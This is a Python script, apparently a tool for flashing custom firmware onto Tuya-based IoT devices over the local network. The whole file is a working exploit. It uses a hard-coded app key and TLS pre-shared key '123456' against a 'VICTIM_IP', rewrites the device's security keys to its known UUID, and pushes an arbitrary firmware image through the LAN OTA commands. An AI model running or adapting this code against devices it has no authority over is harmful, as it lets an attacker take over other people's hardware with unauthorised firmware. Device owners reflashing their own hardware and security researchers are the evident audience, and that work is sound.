#  Copyright (c) Kuba Szczodrzyński 2023-11-11.

import hmac
import json
import socket
import ssl
import sys
from dataclasses import dataclass
from hashlib import md5, sha256
from io import SEEK_SET
from pathlib import Path
from pprint import pprint
from time import sleep

import sslpsk3
from Crypto.Cipher import AES
from datastruct import DataStruct, datastruct
from datastruct.fields import built, const, field, padding
from ltchiptool.util.intbin import letoint

VICTIM_IP = "192.168.176.1"
SOCKET_TIMEOUT = 15.0
# Verbose/debug output (per-frame TX/RX logging). Enabled via the second CLI
# argument ("-v"); otherwise a single-line progress bar is shown instead.
VERBOSE = False


def draw_progress(sent: int, total: int) -> None:
    total = max(total, 1)
    frac = min(max(sent / total, 0.0), 1.0)
    width = 40
    filled = int(width * frac)
    bar = "#" * filled + "-" * (width - filled)
    print(
        f"\rUploading [{bar}] {frac * 100:5.1f}%  ({sent}/{total} bytes)",
        end="",
        flush=True,
    )


@dataclass
@datastruct(padding_pattern=b"\x00")
class Lpv35Frame(DataStruct):
    # 00
    head: int = const(0x6699)(field(">I"))
    # 04
    _1: ... = padding(2)
    # 06
    sequence: int = field(">I", default=0)
    # 10
    type: int = field(">I", default=0x14)
    # 14
    length: int = built(">I", lambda ctx: len(ctx.data) + 12 + 16)

    # 18
    nonce: bytes = field(12, default=b"\xFF" * 12)
    # 30
    data: bytes = field(lambda ctx: ctx.length - 12 - 16)
    # length+2
    # _3: ... = seek(lambda ctx: ctx.length + 2)
    tag: bytes = field(16, default=b"\xFF" * 16)

    # -4
    tail: bytes = const(0x9966)(field(">I"))

    def encrypt_and_pack(self, key: bytes) -> bytes:
        if VERBOSE:
            print(f"<- TX: 0x{self.type:02X}")
            if self.data.startswith(b'{"'):
                pprint(json.loads(self.data))
        # else:
        #     hexdump(self.data)
        data = self.pack()
        aes = AES.new(key=key, mode=AES.MODE_GCM, nonce=self.nonce)
        aes.update(data[4 : 4 + 14])
        self.data, self.tag = aes.encrypt_and_digest(self.data)
        return self.pack()

    @staticmethod
    def unpack_and_decrypt(data: bytes, key: bytes) -> "Lpv35Frame":
        frame = Lpv35Frame.unpack(data)
        aes = AES.new(key=key, mode=AES.MODE_GCM, nonce=frame.nonce)
        aes.update(data[4 : 4 + 14])
        frame.data = aes.decrypt_and_verify(frame.data, frame.tag)
        result = letoint(frame.data[0:4])
        frame.data = frame.data[4:]
        if VERBOSE:
            print(f"-> RX: 0x{frame.type:02X}/{result}")
            if frame.data.startswith(b'{"'):
                pprint(json.loads(frame.data))
        return frame


# TCP AP v4 COMMANDS
FRM_AP_CFG_WF_V40 = 0x14
FRM_AP_CFG_GET_DEV_INFO = 0x16
FRM_AP_CFG_SET_DEV_SCHEMA = 0x17
FRM_LAN_RESET = 0x1D
FRM_AP_CFG_EXT_CMD = 0x1E
FRM_AP_CFG_4G = 0x1F
FRM_AP_CFG_SET_TIME = 0x18

# LAN PROTOCOL COMMANDS (__lan_protocol_process, tuya_svc_lan.c.o)
FRM_SECURITY_TYPE3 = 0x03
FRM_SECURITY_TYPE4 = 0x04  # device->app
FRM_SECURITY_TYPE5 = 0x05
FRM_TP_CMD = 0x07
FRM_TP_NEW_CMD = 0x0D
FRM_QUERY_STAT = 0x0A
FRM_QUERY_STAT_NEW = 0x10
# 0x0c == 0x24 (save to reg center)
FRM_TYPE_REG_CENTER = 0x24
FRM_LAN_QUERY_DP = 0x12
FRM_LAN_OTA_START = 0x1A
FRM_LAN_OTA_DATA = 0x1B
FRM_LAN_RESET = 0x1D
FRM_LAN_OTA_FINISH = 0x1C


SOCKET_RETRIES = 3


def _connect_tcp():
    """Open and connect a TCP socket, retrying up to SOCKET_RETRIES times."""
    for attempt in range(1, SOCKET_RETRIES + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        try:
            sock.connect((VICTIM_IP, 6668))
            return sock
        except Exception as e:
            print(f"Error connecting to TCP socket (attempt {attempt}/{SOCKET_RETRIES}): {e}")
            sock.close()
            if attempt < SOCKET_RETRIES:
                sleep(1.0)
    raise ConnectionError("Failed to establish TCP connection after multiple attempts.")


def get_socket(tls: bool):
    try:
        sock = _connect_tcp()
    except ConnectionError as e:
        raise e
    if not tls:
        return sock

    # Wrap in TLS, retrying up to SOCKET_RETRIES times. A failed TLS handshake
    # leaves the underlying socket unusable, so reconnect TCP before each retry.
    for attempt in range(1, SOCKET_RETRIES + 1):
        sleep(1.0)
        try:
            return sslpsk3.wrap_socket(
                sock,
                ssl_version=ssl.PROTOCOL_TLSv1_2,
                ciphers="ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH",
                psk=lambda hint: b"123456",
                server_side=True,
            )
        except Exception as e:
            print(f"Error establishing TLS connection (attempt {attempt}/{SOCKET_RETRIES}): {e}")
            try:
                sock.close()
            except Exception:
                pass
            if attempt < SOCKET_RETRIES:
                sleep(1.0)
                sock = _connect_tcp()
                if sock is None:
                    raise ConnectionError("Failed to re-establish TCP connection for TLS retry.")
    raise ConnectionError("Failed to establish TLS within opened TCP socket.")


def main():
    global VERBOSE
    if len(sys.argv) < 2:
        print("Pass upgrade file path as an argument (OTA UG BIN)")
        print("Optionally pass -v as a second argument for verbose TX/RX output")
        return
    VERBOSE = len(sys.argv) >= 3 and sys.argv[2] in ("-v", "--verbose")
    fw = Path(sys.argv[1])
    if not fw.is_file():
        print("Upgrade path is not a file")
        return

    app_key1 = bytes.fromhex("4f 58 4c 76 73 6c 43 76 55 78 63 54 50 4c 47 4f")
    app_key1 = md5(app_key1).digest()  # port 6668

    # LAN mode commands, port 6668 - encrypted with secKey
    local_key = b"0" * 16

    print("Attempting to send AP commands")

    # AP mode commands, port 6668 - encrypted using app_key1
    if True:
        # get a TLS socket
        try:
            sock = get_socket(True)
        except ConnectionError as e:
            print(e)
            if e.args and "TLS" in e.args[0]:
                print("AP was accepting TCP connections, but would not accept TLS.  The device configuration is currently stuck in a bad state.  Please do a full pairing reset process to clear the device configuration and try again.")
            else:
                print("AP is not accepting any TCP connections.  Please do a full pairing reset process to clear the device configuration and try again.")
            return

        # FRM_AP_CFG_GET_DEV_INFO - works in AP
        frame = Lpv35Frame(
            type=FRM_AP_CFG_GET_DEV_INFO,
            sequence=1,
            data=b"",
        )
        sock.sendall(frame.encrypt_and_pack(app_key1))
        msg = sock.recv(1024)
        frame = Lpv35Frame.unpack_and_decrypt(msg, app_key1)
        assert frame.type == FRM_AP_CFG_GET_DEV_INFO

        dev_info = json.loads(frame.data)
        uuid = dev_info["uuid"]
        local_key = uuid.encode()

        # tuya_svc_devos_activate_result_parse()
        dev_schema = {
            "devId": dev_info["uuid"],
            "secKey": dev_info["uuid"],
            "localKey": dev_info["uuid"],
        }

        # FRM_AP_CFG_SET_DEV_SCHEMA - works in AP
        frame = Lpv35Frame(
            type=FRM_AP_CFG_SET_DEV_SCHEMA,
            sequence=2,
            data=json.dumps(dev_schema).encode(),
        )
        sock.sendall(frame.encrypt_and_pack(app_key1))
        msg = sock.recv(1024)
        frame = Lpv35Frame.unpack_and_decrypt(msg, app_key1)
        assert frame.type == FRM_AP_CFG_SET_DEV_SCHEMA

        # wait for the socket reconfiguration
        print("Device schema set, waiting for socket reconfiguration")
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
        sleep(5.0)

    print("Attempting to send LAN commands")

    # LAN mode commands, port 6668 - encrypted with secKey
    # get a TCP socket
    try:
        sock = get_socket(False)
    except ConnectionError as e:
        print("Unable to reconnect after setting device configuration.  Please do a full pairing reset process to clear the device configuration and try again.")
        return

    # FRM_SECURITY_TYPE3 - works in STA
    nonce_local = b"0123456789abcdef"
    frame = Lpv35Frame(
        type=FRM_SECURITY_TYPE3,
        sequence=1,
        data=nonce_local,
    )
    sock.sendall(frame.encrypt_and_pack(local_key))

    msg = sock.recv(1024)
    frame = Lpv35Frame.unpack_and_decrypt(msg, local_key)
    assert frame.type == FRM_SECURITY_TYPE4
    assert len(frame.data) == 48
    nonce_remote = frame.data[:16]
    hmac_check = hmac.new(local_key, nonce_local, sha256).digest()
    assert hmac_check == frame.data[16:48]
    hmac_response = hmac.new(local_key, nonce_remote, sha256).digest()

    frame = Lpv35Frame(
        type=FRM_SECURITY_TYPE5,
        sequence=2,
        data=hmac_response,
    )
    sock.sendall(frame.encrypt_and_pack(local_key))

    nonce_xor = bytes([a ^ b for (a, b) in zip(nonce_local, nonce_remote)])
    aes = AES.new(key=local_key, mode=AES.MODE_GCM, nonce=nonce_local[:12])
    session_key, _ = aes.encrypt_and_digest(nonce_xor)

    fw_data = fw.read_bytes()
    fw_sha = sha256(fw_data).hexdigest().upper()
    fw_hmac = hmac.new(local_key, fw_sha.encode(), sha256).hexdigest().upper()

    frame = Lpv35Frame(
        type=FRM_LAN_OTA_START,
        sequence=3,
        data=json.dumps(
            {
                "otaChannel": 0,
                "otaFileLen": fw.stat().st_size,
                "otaVersion": "9.0.0",  # 10
                "fileHmac": fw_hmac,  # 40
                "isDiffOta": 0,
            }
        ).encode(),
    )
    sock.sendall(frame.encrypt_and_pack(session_key))

    f = fw.open("rb")
    total = fw.stat().st_size

    sock.settimeout(SOCKET_TIMEOUT)
    ota_send_complete = False

    while True:
        try:
            msg = sock.recv(4096)
        except socket.timeout:
            if ota_send_complete is False:
                print("Socket timed out while attempting OTA.  Please try again.")
                return
            else:
                print("\nOTA upload completed, but we didn't get a final confirmation packet.  This usually means success, but check to see if your device rebooted to custom firmware, which may take a couple minutes.  If it does not, please retry from the beginning.")
                break
        if not msg:
            break
        frame = Lpv35Frame.unpack_and_decrypt(msg, session_key)
        if frame.type == FRM_LAN_OTA_FINISH:
            if not VERBOSE:
                print()  # terminate the progress bar line
            print("Reported OTA finished!")
            break

        try:
            data = json.loads(frame.data)
        except:
            continue
        if "file_offset" not in data:
            print(data)
            continue

        offset = int(data["file_offset"])
        length = int(data["data_block_len"])
        if VERBOSE:
            print(f"Sending OTA package: 0x{offset:X}, length {length}")
        else:
            draw_progress(offset + length, total)
            if offset + length >= total:
                ota_send_complete = True
        f.seek(offset, SEEK_SET)
        chunk = f.read(length)
        frame = Lpv35Frame(
            type=FRM_LAN_OTA_DATA,
            sequence=frame.sequence + 1,
            data=chunk,
        )
        sock.sendall(frame.encrypt_and_pack(session_key))

    f.close()

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()


if __name__ == "__main__":
    main()
